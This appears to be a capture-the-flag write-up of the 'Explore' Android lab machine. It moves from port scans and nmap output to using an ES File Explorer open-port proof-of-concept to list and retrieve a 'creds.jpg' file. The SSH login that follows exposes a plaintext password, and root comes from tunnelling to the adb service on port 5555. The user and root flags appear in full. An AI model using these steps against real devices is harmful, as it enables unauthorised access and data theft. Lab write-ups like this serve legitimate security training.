# Writeup
## Recon

### rustscan

- I used rustscan for a quick initial port scan 

```
sudo rustscan -a 10.10.10.247 | tee rustscan.txt
```

```
[~] Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-13 01:53 EDT
Initiating Ping Scan at 01:53
Scanning 10.10.10.247 [4 ports]
Completed Ping Scan at 01:53, 0.17s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 01:53
Completed Parallel DNS resolution of 1 host. at 01:53, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 01:53
Scanning 10.10.10.247 [4 ports]
Discovered open port 42135/tcp on 10.10.10.247
Discovered open port 2222/tcp on 10.10.10.247
Discovered open port 42127/tcp on 10.10.10.247
Discovered open port 59777/tcp on 10.10.10.247
Completed SYN Stealth Scan at 01:53, 0.15s elapsed (4 total ports)
Nmap scan report for 10.10.10.247
Host is up, received reset ttl 63 (0.12s latency).
Scanned at 2021-08-13 01:53:22 EDT for 0s

PORT      STATE SERVICE      REASON
2222/tcp  open  EtherNetIP-1 syn-ack ttl 63
42127/tcp open  unknown      syn-ack ttl 63
42135/tcp open  unknown      syn-ack ttl 63
59777/tcp open  unknown      syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.43 seconds
```

### Manual nmap scans

- Nmap -A scanning for the specific ports showed that there was probably an instance of ES File Explorer running, as well as a "Banana Studio" SSH server that could be useful for initial access with credentials.

```
sudo nmap -A 10.10.10.247 -p 2222,42127,42135,59777 | tee nmap-all.txt
```

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-13 01:55 EDT
Nmap scan report for 10.10.10.247
Host is up (0.12s latency).

PORT      STATE SERVICE VERSION
2222/tcp  open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey: 
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
42127/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 13 Aug 2021 05:55:36 GMT
|     Content-Length: 22
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|   GetRequest: 
|     HTTP/1.1 412 Precondition Failed
|     Date: Fri, 13 Aug 2021 05:55:36 GMT
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.0 501 Not Implemented
|     Date: Fri, 13 Aug 2021 05:55:42 GMT
|     Content-Length: 29
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Method not supported: OPTIONS
|   Help: 
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 13 Aug 2021 05:55:57 GMT
|     Content-Length: 26
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: HELP
|   RTSPRequest: 
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 13 Aug 2021 05:55:42 GMT
|     Content-Length: 39
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     valid protocol version: RTSP/1.0
|   SSLSessionReq: 
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 13 Aug 2021 05:55:57 GMT
|     Content-Length: 73
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|     ?G???,???`~?
|     ??{????w????<=?o?
|   TLSSessionReq: 
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 13 Aug 2021 05:55:57 GMT
|     Content-Length: 71
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|     ??random1random2random3random4
|   TerminalServerCookie: 
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 13 Aug 2021 05:55:57 GMT
|     Content-Length: 54
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|_    Cookie: mstshash=nmap
42135/tcp open  http    ES File Explorer Name Response httpd
|_http-title: Site doesn't have a title (text/html).
59777/tcp open  http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn't have a title (text/plain).
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2222-TCP:V=7.91%I=7%D=8/13%Time=61160959%P=x86_64-pc-linux-gnu%r(NU
SF:LL,24,"SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port42127-TCP:V=7.91%I=7%D=8/13%Time=61160958%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,AA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Fri,\x20
SF:13\x20Aug\x202021\x2005:55:36\x20GMT\r\nContent-Length:\x2022\r\nConten
SF:t-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\
SF:r\nInvalid\x20request\x20line:\x20")%r(GetRequest,5C,"HTTP/1\.1\x20412\
SF:x20Precondition\x20Failed\r\nDate:\x20Fri,\x2013\x20Aug\x202021\x2005:5
SF:5:36\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,B5,"HTTP/1\
SF:.0\x20501\x20Not\x20Implemented\r\nDate:\x20Fri,\x2013\x20Aug\x202021\x
SF:2005:55:42\x20GMT\r\nContent-Length:\x2029\r\nContent-Type:\x20text/pla
SF:in;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nMethod\x20not\x2
SF:0supported:\x20OPTIONS")%r(RTSPRequest,BB,"HTTP/1\.0\x20400\x20Bad\x20R
SF:equest\r\nDate:\x20Fri,\x2013\x20Aug\x202021\x2005:55:42\x20GMT\r\nCont
SF:ent-Length:\x2039\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r
SF:\nConnection:\x20Close\r\n\r\nNot\x20a\x20valid\x20protocol\x20version:
SF:\x20\x20RTSP/1\.0")%r(Help,AE,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDa
SF:te:\x20Fri,\x2013\x20Aug\x202021\x2005:55:57\x20GMT\r\nContent-Length:\
SF:x2026\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection
SF::\x20Close\r\n\r\nInvalid\x20request\x20line:\x20HELP")%r(SSLSessionReq
SF:,DD,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Fri,\x2013\x20Aug\x
SF:202021\x2005:55:57\x20GMT\r\nContent-Length:\x2073\r\nContent-Type:\x20
SF:text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nInvalid\
SF:x20request\x20line:\x20\x16\x03\0\0S\x01\0\0O\x03\0\?G\?\?\?,\?\?\?`~\?
SF:\0\?\?{\?\?\?\?w\?\?\?\?<=\?o\?\x10n\0\0\(\0\x16\0\x13\0")%r(TerminalSe
SF:rverCookie,CA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Fri,\x201
SF:3\x20Aug\x202021\x2005:55:57\x20GMT\r\nContent-Length:\x2054\r\nContent
SF:-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r
SF:\nInvalid\x20request\x20line:\x20\x03\0\0\*%\?\0\0\0\0\0Cookie:\x20msts
SF:hash=nmap")%r(TLSSessionReq,DB,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nD
SF:ate:\x20Fri,\x2013\x20Aug\x202021\x2005:55:57\x20GMT\r\nContent-Length:
SF:\x2071\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnectio
SF:n:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20\x16\x03\0\0i\x01\0\0
SF:e\x03\x03U\x1c\?\?random1random2random3random4\0\0\x0c\0/\0");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Sony X75CH-series Android TV (Android 5.0) (94%), Linux 3.8 (93%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Android 4.1 - 6.0 (Linux 3.4 - 3.14) (93%), Android 5.0 - 7.0 (Linux 3.4 - 3.10) (93%), Adtran 424RG FTTH gateway (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Device: phone

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   116.99 ms 10.10.14.1
2   117.50 ms 10.10.10.247

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.67 seconds

```

## Initial Access

### ES File Explorer Vulnerability

- A quick Google search of ES File Explorer vulnerabilities led to the ESFileExplorerOpenPortVuln PoC code that I found, as well as a Metasploit module that I didn't use.
- I used the PoC script to list the pictures on the device, and lo and behold, there was a very interesting `creds.jpg` file.

```
┌──(kali㉿kali)-[~/HTB/machines/explore/ESFileExplorerOpenPortVuln]
└─$ python3 poc.py --host  10.10.10.247 --cmd listPics      
[*] Executing command: listPics on 10.10.10.247
[*] Server responded with: 200

{"name":"concept.jpg", "time":"4/21/21 02:38:08 AM", "location":"/storage/emulated/0/DCIM/concept.jpg", "size":"135.33 KB (138,573 Bytes)", },
{"name":"anc.png", "time":"4/21/21 02:37:50 AM", "location":"/storage/emulated/0/DCIM/anc.png", "size":"6.24 KB (6,392 Bytes)", },
{"name":"creds.jpg", "time":"4/21/21 02:38:18 AM", "location":"/storage/emulated/0/DCIM/creds.jpg", "size":"1.14 MB (1,200,401 Bytes)", },
{"name":"224_anc.png", "time":"4/21/21 02:37:21 AM", "location":"/storage/emulated/0/DCIM/224_anc.png", "size":"124.88 KB (127,876 Bytes)"}
```

- Using the vulnerable ES File Explorer open port, I was able to exfiltrate the image and gather credentials. 

![[03b75d2bd50776cbb6e2605c90f6a939-1.png]]

- The credentials are `kristi:Kr1sT!5h@Rp3xPl0r3!`
- I used the credentials to connect to the SSH server found earlier on port 2222. User flag done!

```
┌──(kali㉿kali)-[~/HTB/machines/explore/ESFileExplorerOpenPortVuln]
└─$ ssh -p 2222 kristi@10.10.10.247                   
Password authentication
Password: 
:/ $ cd sdcard
:/sdcard $ ls
Alarms  DCIM     Movies Notifications Podcasts  backups   user.txt 
Android Download Music  Pictures      Ringtones dianxinos 
:/sdcard $ cat user.txt
f32017174c7c7e8f50c6da52891ae250
:/sdcard $ 
```


## Privesc

### Enumerating ports locally

- I found that the 5555 port was listening internally, but it was not open to Kali. After some Google searching, I determined that this port might be used for adb over the network and could potentially be used for privilege escalation.

```
:/ $ ss -tulnp | grep LISTEN                                                   
tcp    LISTEN     0      8        [::ffff:127.0.0.1]:46759                 *:*                  
tcp    LISTEN     0      50        [::ffff:10.10.10.247]:46857                 *:*                  
tcp    LISTEN     0      50        *:2222                  *:*                   users:(("grep",pid=28349,fd=73),("ss",pid=28348,fd=73),("sh",pid=24677,fd=73),("droid.sshserver",pid=4577,fd=73))
tcp    LISTEN     0      4         *:5555                  *:*                  
tcp    LISTEN     0      10        *:42135                 *:*                  
tcp    LISTEN     0      50        *:59777                 *:*    
```

- To get access to the port, I used SSH local port forwarding with the same credentials.

```
┌──(kali㉿kali)-[~]
└─$ ssh -p 2222 kristi@10.10.10.247 -L 127.0.0.1:5555:127.0.0.1:5555
```

- I connected to the local port forward with `adb` (had to install the `adb` package first) through the SSH tunnel and spawned a root shell on the device. 

```
┌──(kali㉿kali)-[~]                                                                                                   
└─$ adb devices                                                                                                       
* daemon not running; starting now at tcp:5037                                                                        
* daemon started successfully                                                                                         
List of devices attached                                                                                              
emulator-5554   device 

┌──(kali㉿kali)-[~]                                                                                                                                                                                                                          
└─$ adb connect 127.0.0.1:5555                                                                                                                                                                                                               
connected to 127.0.0.1:5555  

┌──(kali㉿kali)-[~]                                                                                                                                                                                                                          
└─$ adb devices                                                                                                       
List of devices attached                                   
127.0.0.1:5555  device                                     
emulator-5554   device       

┌──(kali㉿kali)-[~]                                        
└─$ adb -s 127.0.0.1:5555 shell                            
x86_64:/ $ su 
:/ # whoami                                                
root  
```

- Root flag done!

```
:/ # cd data                                               
:/data # ls                                                
adb           bootchart     media       property       tombstones                                                     
anr           cache         mediadrm    resource-cache user                                                           
app           dalvik-cache  misc        root.txt       user_de                                                        
app-asec      data          misc_ce     ss             vendor                                                         
app-ephemeral drm           misc_de     ssh_starter.sh vendor_ce                                                      
app-lib       es_starter.sh nfc         system         vendor_de                                                      
app-private   local         ota         system_ce                                                                     
backup        lost+found    ota_package system_de                                                                     
:/data # cat root.txt                                      
f04fc82b6d49b41c9b08982be59338c5  
```
